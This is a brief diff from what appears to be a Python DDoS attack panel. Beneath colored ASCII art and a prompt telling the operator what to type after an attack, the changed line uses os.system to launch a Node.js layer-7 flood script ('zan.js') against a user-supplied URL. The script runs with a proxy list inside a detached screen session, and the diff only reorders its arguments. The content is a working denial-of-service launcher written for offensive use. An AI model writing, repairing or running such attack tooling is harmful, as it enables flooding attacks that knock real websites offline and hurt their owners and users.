@@ -607,7 +607,7 @@ def main():
 ⠀⠀⠀⠀\x1b[38;2;255;0;0m⢹⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⢧⡀⠀⠀⠀⠀⠀\033[37m⢹⠙⣷⣧ \033[37mPlease After Attack Type \033[1;34m'CLS'\033[37m For Back To Home
 ⠀⠀⠀⠀\x1b[38;2;255;0;0m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[37m⠈⢀⣿⠛ 
 \033[0m""")
-                    os.system(f'cd l7 && screen -dm node zan.js {url} {duration} 4 proxy.txt 32 flood true')
+                    os.system(f'cd l7 && screen -dm node zan.js {url} {duration} 32 4 proxy.txt')
                     
             except ValueError:
                 main()
